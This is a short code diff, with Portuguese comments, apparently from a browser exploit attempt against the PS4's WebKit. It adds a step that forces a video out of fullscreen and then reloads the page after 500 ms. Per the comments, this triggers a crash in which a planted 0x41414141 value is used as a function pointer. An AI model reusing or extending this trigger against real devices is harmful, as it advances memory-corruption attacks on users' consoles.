@@ -40,6 +40,21 @@ export default {
 
             
 
+
+    // 3. O ATAQUE DIRETO: Forçamos a função de saída PRÓPRIA do player apos isso o crash ocorre com o setTimeout(() => location.reload(), 500)
+    if (videoAlvo && videoAlvo.webkitExitFullscreen) {
+        videoAlvo.webkitExitFullscreen();
+    } else if (videoAlvo && videoAlvo.webkitExitFullScreen) {
+        videoAlvo.webkitExitFullScreen();
+    }
+
+    
+} catch(e) {
+    log("[ERRO] " + e);
+}
+            //4. Aqui que acontece a mágica! quando a página esta saindo do modo Fullscreen o crash ocorre o valor 500 não pode ser alterado!
+            setTimeout(() => location.reload(), 500);
+        };
             // 3. USE: Disparamos o controlador. 
             // Se ele ler o nosso 0x41414141 como se fosse um ponteiro de função,
             // a PS4 vai dar crash imediato (CE-34878-0) tentando executar a morada 0x41414141!
